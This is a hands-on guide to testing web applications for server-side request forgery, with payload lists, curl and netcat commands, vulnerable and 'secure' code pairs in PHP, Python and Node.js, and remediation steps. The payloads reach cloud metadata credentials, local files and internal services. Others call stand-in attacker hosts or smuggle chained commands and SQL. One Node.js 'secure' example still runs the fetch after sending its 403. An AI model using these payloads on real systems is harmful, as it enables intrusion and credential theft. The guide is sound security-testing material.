# Testing for Server-Side Request Forgery Vulnerabilities

## Overview

Testing for Server-Side Request Forgery (SSRF) vulnerabilities involves verifying that a web application properly validates user-controlled input used in server-side requests to prevent attackers from accessing internal systems, exfiltrating sensitive data, or interacting with unauthorized services. According to OWASP (WSTG-INPV-019), SSRF occurs when an attacker manipulates server-side HTTP requests to target internal or external resources, bypassing access controls. This guide provides a hands-on methodology to test for SSRF vulnerabilities, focusing on identifying entry points, basic SSRF, internal network access, cloud metadata access, blind SSRF, protocol manipulation, filter bypass, and chained attacks, with tools, commands, payloads, and remediation strategies.

**Impact**: Server-Side Request Forgery vulnerabilities can lead to:
- Unauthorized access to internal networks or services (e.g., databases, admin panels).
- Exposure of cloud metadata (e.g., AWS IAM credentials).
- Data exfiltration or interaction with malicious servers.
- Denial of service (DoS) by overwhelming internal resources.
- Non-compliance with security standards (e.g., PCI DSS, GDPR).

**Ethical Note**: Obtain explicit permission before testing, as SSRF attacks may access internal systems, exfiltrate sensitive data, or disrupt services, potentially causing significant harm.

## Testing Tools

The following tools are recommended for testing Server-Side Request Forgery vulnerabilities, with setup instructions optimized for new pentesters:

- **Burp Suite Community Edition**: Intercepts and modifies HTTP requests to manipulate URLs in server-side requests.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080` (Firefox recommended).
  - Use Repeater to test payloads and Proxy > HTTP History to identify entry points.
  - **Note**: Use “Collaborator” (manual setup in Community Edition) for blind SSRF detection.

- **OWASP ZAP 3.0**: A free tool for automated and manual injection testing.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD (Heads-Up Display):
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with SSRF rules; manually verify findings due to false positives.

- **cURL and HTTPie**: Send HTTP requests with SSRF payloads.
  - **cURL**:
    - Install on Linux:
      ```bash
      sudo apt install curl
      ```
    - Install on Windows/Mac: Pre-installed or download from [curl.se](https://curl.se/).
  - **HTTPie** (beginner-friendly):
    - Install on Linux/Mac:
      ```bash
      sudo apt install httpie
      ```
    - Install on Windows: `pip install httpie`.
    - Example:
      ```bash
      # cURL
      curl -i "http://example.com/fetch?url=http://localhost"
      # HTTPie
      http "http://example.com/fetch?url=http://localhost"
      ```

- **Postman**: GUI tool for testing SSRF payloads in APIs or forms.
  - Download from [Postman](https://www.postman.com/downloads/).
  - Send payloads in query parameters or body.
  - **Tip**: Use Collections for batch testing.

- **Browser Developer Tools (Chrome/Firefox)**: Inspects responses to SSRF payloads.
  - Access: Press `F12` or `Ctrl+Shift+I`.
  - Use Network tab to analyze responses and Console tab for errors.
  - **Note**: Firefox’s 2025 response inspection enhancements improve debugging.

- **Netcat (nc)**: Tests raw HTTP requests and listens for blind SSRF callbacks.
  - Install on Linux:
    ```bash
    sudo apt install netcat
    ```
  - Install on Windows/Mac: Download from [nmap.org](https://nmap.org/ncat/).
  - Example:
    ```bash
    echo -e "GET /fetch?url=http://localhost HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-INPV-019, testing Server-Side Request Forgery vulnerabilities across entry points, basic SSRF, internal network access, cloud metadata access, blind SSRF, protocol manipulation, filter bypass, and chained attacks.

### Common Server-Side Request Forgery Payloads

Below is a list of common payloads to test for SSRF vulnerabilities. Start with simple payloads to confirm SSRF, then escalate to advanced payloads. Use with caution in controlled environments to avoid accessing sensitive systems or causing disruptions.

- **Basic SSRF Payloads**:
  - `http://localhost` (Localhost access)
  - `http://127.0.0.1` (Localhost IP)
  - `http://[::1]` (IPv6 localhost)
  - `http://example.com` (External site)

- **Internal Network Access Payloads**:
  - `http://10.0.0.1` (Private IP)
  - `http://192.168.1.1` (Private network)
  - `http://intranet.local` (Internal hostname)
  - `http://172.16.0.1:8080` (Internal service with port)

- **Cloud Metadata Payloads**:
  - `http://169.254.169.254/latest/meta-data/` (AWS metadata)
  - `http://metadata.google.internal/computeMetadata/v1/` (GCP metadata)
  - `http://169.254.169.254/metadata/v1/` (Azure metadata)
  - `http://169.254.169.254/openstack/latest/meta_data.json` (OpenStack metadata)

- **Blind SSRF Payloads**:
  - `http://burpcollaborator.net` (Burp Collaborator callback)
  - `http://attacker.com/log` (Attacker-controlled server)
  - `http://<your-vps-ip>:8080` (Custom listener)
  - `http://dnsbin.attacker.com` (DNS-based callback)

- **Protocol Manipulation Payloads**:
  - `file:///etc/passwd` (File protocol)
  - `gopher://localhost:6379/_INFO` (Gopher for Redis)
  - `ftp://attacker.com` (FTP protocol)
  - `dict://localhost:11211/stat` (Memcached protocol)

- **Filter Bypass Payloads**:
  - `http://127.0.0.1#@example.com` (Obfuscation with @)
  - `http://localhost:80@attacker.com` (Port and @)
  - `http://127.0.0.1%20@attacker.com` (Encoded space)
  - `http://0x7f000001` (Hex-encoded IP)

- **Chained Attack Payloads**:
  - `http://localhost/admin?cmd=whoami` (SSRF + Command Injection)
  - `http://169.254.169.254/latest/meta-data/iam/security-credentials/role<script>alert(1)</script>` (SSRF + XSS)
  - `http://internal:8080/api?sql=1;DROP TABLE users` (SSRF + SQL Injection)
  - `http://localhost?host=attacker.com` (SSRF + Host Header Injection)

**Note**: Payloads depend on the application’s request handling (e.g., cURL, HTTP libraries) and server environment (e.g., AWS, on-premises). Test payloads in query parameters, form fields, headers, or JSON payloads where URLs are processed.

### 1. Identify SSRF Entry Points

**Objective**: Locate inputs that influence server-side requests.

**Steps**:
1. Browse the website:
   - Visit the target (e.g., `http://example.com`).
   - Identify features like URL fetchers, webhooks, or file imports (e.g., image previews, API integrations).
2. Capture requests with Burp Suite:
   - Enable Intercept (Proxy > Intercept > On).
   - Submit forms or interact with features to capture requests in HTTP History.
   - Note parameters (e.g., `url=http://example.com`, `file=import.txt`).
3. Inspect responses:
   - Check for fetched content or errors indicating server-side requests.
   - Use Developer Tools (`Ctrl+Shift+I`) to analyze responses.
4. List entry points:
   - Document query strings, form fields, headers, and JSON payloads.

**Example Entry Points**:
- URL: `http://example.com/fetch?url=http://example.com`
- Form: `<input name="image_url">`
- API: `POST /api/import` with `{"url": "http://example.com"}`

**Remediation**:
- Validate URLs:
  ```php
  if (!filter_var($url, FILTER_VALIDATE_URL)) die("Invalid URL");
  ```
- Whitelist domains:
  ```php
  $allowed = ['example.com'];
  if (!in_array(parse_url($url, PHP_URL_HOST), $allowed)) die("Invalid domain");
  ```

**Tip**: Save the entry point list in a report.

### 2. Test for Basic SSRF

**Objective**: Verify if user input controls server-side requests.

**Steps**:
1. Identify URL inputs:
   - Look for parameters like `?url=http://example.com`.
2. Inject basic payloads:
   - Use Burp Repeater:
     ```http
     GET /fetch?url=http://localhost HTTP/1.1
     Host: example.com
     ```
   - Use cURL:
     ```bash
     curl -i "http://example.com/fetch?url=http://localhost"
     ```
3. Check responses:
   - Look for localhost content or errors.
   - Test: `http://127.0.0.1`, `http://[::1]`.
4. Test external sites:
   - Try: `http://example.com`.

**Example Vulnerable Code (PHP)**:
```php
$url = $_GET['url'];
$response = file_get_contents($url);
echo $response;
```
Test: `?url=http://localhost`
Result: Fetches localhost content.

**Example Secure Code (PHP)**:
```php
$url = $_GET['url'];
if (parse_url($url, PHP_URL_HOST) !== 'example.com') die("Invalid URL");
$response = file_get_contents($url);
echo $response;
```
Test: No unauthorized access.

**Remediation**:
- Restrict hosts:
  ```php
  $host = parse_url($url, PHP_URL_HOST);
  if ($host !== 'example.com') die("Invalid host");
  ```
- Use safe libraries:
  ```php
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
  ```

**Tip**: Save SSRF evidence in a report.

### 3. Test for Internal Network Access

**Objective**: Check if SSRF allows access to internal networks.

**Steps**:
1. Inject internal network payloads:
   - Test: `http://10.0.0.1`
   - Use Burp:
     ```http
     GET /fetch?url=http://10.0.0.1 HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for internal service responses (e.g., admin panels).
   - Test: `http://192.168.1.1`, `http://intranet.local`.
3. Test ports:
   - Try: `http://10.0.0.1:8080`.
4. Use cURL:
   ```bash
   curl -i "http://example.com/fetch?url=http://192.168.1.1"
   ```

**Example Vulnerable Code (Python)**:
```python
import requests
url = request.args.get('url')
response = requests.get(url)
return response.text
```
Test: `?url=http://10.0.0.1`
Result: Accesses internal service.

**Example Secure Code (Python)**:
```python
from urllib.parse import urlparse
url = request.args.get('url')
if urlparse(url).hostname not in ['example.com']: abort(403)
response = requests.get(url)
return response.text
```
Test: No internal access.

**Remediation**:
- Block private IPs:
  ```python
  import ipaddress
  if ipaddress.ip_address(urlparse(url).hostname).is_private: abort(403)
  ```
- Restrict ports:
  ```python
  if urlparse(url).port not in [80, 443]: abort(403)
  ```

**Tip**: Save internal access evidence in a report.

### 4. Test for Cloud Metadata Access

**Objective**: Verify if SSRF can access cloud provider metadata.

**Steps**:
1. Inject cloud metadata payloads:
   - Test: `http://169.254.169.254/latest/meta-data/`
   - Use Burp:
     ```http
     GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for metadata (e.g., IAM credentials).
   - Test: `http://metadata.google.internal/computeMetadata/v1/`.
3. Test variations:
   - Try: `http://169.254.169.254/metadata/v1/`.
4. Use Postman for APIs:
   - Send: `{"url": "http://169.254.169.254/latest/meta-data/"}`.

**Example Vulnerable Code (Node.js)**:
```javascript
const url = req.query.url;
fetch(url).then(res => res.text()).then(data => res.send(data));
```
Test: `?url=http://169.254.169.254/latest/meta-data/`
Result: Exposes AWS metadata.

**Example Secure Code (Node.js)**:
```javascript
const url = req.query.url;
if (new URL(url).hostname === 'example.com') {
  fetch(url).then(res => res.text()).then(data => res.send(data));
} else {
  res.status(403).send('Invalid URL');
}
```
Test: No metadata access.

**Remediation**:
- Block metadata IPs:
  ```javascript
  if (new URL(url).hostname === '169.254.169.254') res.status(403).send('Forbidden');
  ```
- Use IMDSv2:
  ```bash
  aws ec2 modify-instance-metadata-options --http-tokens required
  ```

**Tip**: Save metadata access evidence in a report.

### 5. Test for Blind SSRF

**Objective**: Check if SSRF triggers requests without visible responses.

**Steps**:
1. Inject blind payloads:
   - Test: `http://burpcollaborator.net`
   - Use cURL:
     ```bash
     curl -i "http://example.com/fetch?url=http://burpcollaborator.net"
     ```
2. Monitor callbacks:
   - Check Burp Collaborator or custom server logs (`nc -l 8080`).
   - Test: `http://attacker.com/log`.
3. Test DNS-based payloads:
   - Try: `http://dnsbin.attacker.com`.
4. Use Burp Collaborator:
   - Generate unique URL and monitor interactions.

**Example Vulnerable Code (PHP)**:
```php
$url = $_GET['url'];
file_get_contents($url);
```
Test: `?url=http://burpcollaborator.net`
Result: Triggers request.

**Example Secure Code (PHP)**:
```php
$url = $_GET['url'];
if (parse_url($url, PHP_URL_HOST) !== 'example.com') die("Invalid URL");
file_get_contents($url);
```
Test: No request.

**Remediation**:
- Validate URLs:
  ```php
  if (!preg_match('/^https?:\/\/example\.com/', $url)) die("Invalid URL");
  ```
- Log requests:
  ```php
  error_log("Fetching URL: $url");
  ```

**Tip**: Save callback evidence in a report.

### 6. Test for Protocol Manipulation

**Objective**: Verify if SSRF allows non-HTTP protocols.

**Steps**:
1. Inject protocol payloads:
   - Test: `file:///etc/passwd`
   - Use Burp:
     ```http
     GET /fetch?url=file:///etc/passwd HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for file contents or errors.
   - Test: `gopher://localhost:6379/_INFO`.
3. Test other protocols:
   - Try: `ftp://attacker.com`, `dict://localhost:11211/stat`.
4. Use Netcat:
   ```bash
   echo -e "GET /fetch?url=file:///etc/passwd HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
   ```

**Example Vulnerable Code (Python)**:
```python
import urllib.request
url = request.args.get('url')
return urllib.request.urlopen(url).read()
```
Test: `?url=file:///etc/passwd`
Result: Reads file.

**Example Secure Code (Python)**:
```python
from urllib.parse import urlparse
url = request.args.get('url')
if urlparse(url).scheme not in ['http', 'https']: abort(403)
return urllib.request.urlopen(url).read()
```
Test: No file access.

**Remediation**:
- Restrict protocols:
  ```python
  if urlparse(url).scheme not in ['http', 'https']: abort(403)
  ```
- Disable file access:
  ```python
  urllib.request.install_opener(urllib.request.build_opener(urllib.request.HTTPHandler, urllib.request.HTTPSHandler))
  ```

**Tip**: Save protocol manipulation evidence in a report.

### 7. Test for Filter Bypass

**Objective**: Check if SSRF filters can be bypassed.

**Steps**:
1. Inject bypass payloads:
   - Test: `http://127.0.0.1#@example.com`
   - Use cURL:
     ```bash
     curl -i "http://example.com/fetch?url=http://127.0.0.1#@example.com"
     ```
2. Check responses:
   - Look for localhost access.
   - Test: `http://127.0.0.1%20@attacker.com`.
3. Test obfuscation:
   - Try: `http://0x7f000001`, `http://localhost:80@attacker.com`.
4. Use Burp Intruder:
   - Fuzz with bypass payloads.

**Example Vulnerable Code (Node.js)**:
```javascript
const url = req.query.url;
if (!url.includes('localhost')) {
  fetch(url).then(res => res.text()).then(data => res.send(data));
}
```
Test: `?url=http://127.0.0.1#@example.com`
Result: Bypasses filter.

**Example Secure Code (Node.js)**:
```javascript
const url = req.query.url;
const hostname = new URL(url).hostname;
if (hostname !== 'example.com') res.status(403).send('Invalid URL');
fetch(url).then(res => res.text()).then(data => res.send(data));
```
Test: No bypass.

**Remediation**:
- Parse URLs properly:
  ```javascript
  const hostname = new URL(url).hostname;
  ```
- Block obfuscation:
  ```javascript
  if (url.includes('@') || url.includes('%20')) res.status(403).send('Invalid URL');
  ```

**Tip**: Save bypass evidence in a report.

### 8. Test for Chained Attacks

**Objective**: Verify if SSRF can be combined with other vulnerabilities.

**Steps**:
1. Inject chained payloads:
   - Test: `http://localhost/admin?cmd=whoami`
   - Use Burp:
     ```http
     GET /fetch?url=http://localhost/admin?cmd=whoami HTTP/1.1
     Host: example.com
     ```
2. Check responses:
   - Look for command execution or other effects.
   - Test: `http://169.254.169.254/latest/meta-data/iam/security-credentials/role<script>alert(1)</script>`.
3. Test other vulnerabilities:
   - Try: `http://internal:8080/api?sql=1;DROP TABLE users`.
4. Use Postman:
   - Send: `{"url": "http://localhost/admin?cmd=whoami"}`.

**Example Vulnerable Code (PHP)**:
```php
$url = $_GET['url'];
echo file_get_contents($url);
```
Test: `?url=http://localhost/admin?cmd=whoami`
Result: Executes command.

**Example Secure Code (PHP)**:
```php
$url = $_GET['url'];
if (parse_url($url, PHP_URL_HOST) !== 'example.com') die("Invalid URL");
echo file_get_contents($url);
```
Test: No execution.

**Remediation**:
- Combine defenses:
  ```php
  $url = filter_var($url, FILTER_VALIDATE_URL);
  if (parse_url($url, PHP_URL_HOST) !== 'example.com' || parse_url($url, PHP_URL_SCHEME) !== 'https') die("Invalid URL");
  ```
- Implement CSP:
  ```html
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
  ```

**Tip**: Save chained attack evidence in a report.